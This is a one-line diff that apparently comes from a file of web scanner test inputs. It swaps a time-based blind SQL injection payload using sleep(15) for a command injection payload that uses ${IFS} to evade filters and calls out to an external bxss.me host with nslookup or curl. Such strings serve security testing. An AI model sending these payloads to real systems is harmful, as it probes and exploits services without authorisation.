@@ -1,1 +1,1 @@
-5550'XOR(555*if(now()=sysdate(),sleep(15),0))XOR'Z
+|(nslookup${IFS}-q${IFS}cname${IFS}hithmptpmxtab55fe7.bxss.me||curl${IFS}hithmptpmxtab55fe7.bxss.me)
